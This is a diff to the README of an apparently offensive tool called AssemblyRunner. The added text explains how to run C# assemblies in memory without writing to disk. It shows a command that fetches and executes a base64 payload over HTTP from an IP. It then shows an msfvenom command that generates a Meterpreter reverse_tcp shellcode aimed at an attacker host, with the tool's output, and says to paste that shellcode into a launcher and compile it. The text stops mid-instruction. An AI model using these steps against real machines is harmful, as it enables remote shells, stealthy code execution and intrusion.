@@ -9,4 +9,17 @@ AssemblyRunner.exe -net http://IP/seatbelt.b64 "BasicOSInfo"
 Result: File is retreived over HTTP in-memory, base64 decoded, and then executed
 
 EXAMPLE:
-Compile a C# binary, such as 
+Compile a C# binary, such as AssemblyRunner/AssemblyRunner/Launchers/shellcodelauncher.cs that is included in this repo.
+Goal Remotely execute a C# Assembly without touching disk.
+Kali:
+msfvenon -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f csharp 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 510 bytes
+Final size of csharp file: 2615 bytes
+byte[] buf = new byte[510] { 0xfc0x48...... }
+<SNIPPED>
+
+copy byte length from output, 510 in this example and shellcode between curly braces {} to the shellcodelauncher.cs file
+compile this 
